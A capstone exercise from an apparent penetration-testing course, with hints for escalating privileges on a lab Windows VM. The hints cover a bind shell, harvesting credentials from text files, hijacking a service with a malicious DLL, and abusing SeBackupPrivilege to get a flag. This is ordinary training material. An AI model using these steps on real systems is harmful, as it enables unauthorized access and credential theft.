Capstone Exercise: Get access to CLIENTWK222 (VM #2) by connecting to the bind shell on port 4444. Use the methods covered in this Module to elevate your privileges to an administrative user. Enter the flag, which is located in C:\Users\enterpriseadmin\Desktop\flag.txt.
HINT
1) Connect to port 4444 on your assigned VM #2.
2) Use the command in Listing 18 to search for text files in the C:\users directory, for any user and password information.
3) Access RDP using the found credentials. Check for unusual services with write permissions using the command in Listing 40.
4) Restart the service with your malicious .dll payload for higher privileges (enterpriseuser).
5) Check your privileges (whoami /priv).
6) Note that the Spooler service is stopped, so the PrintSpoofer exploit won't work.
7) If a privilege is Disabled (SeBackupPrivilege) and present, you can still attempt it and try retrieving the flag by copying the Desktop contents of the enterpriseadmin user in this case.
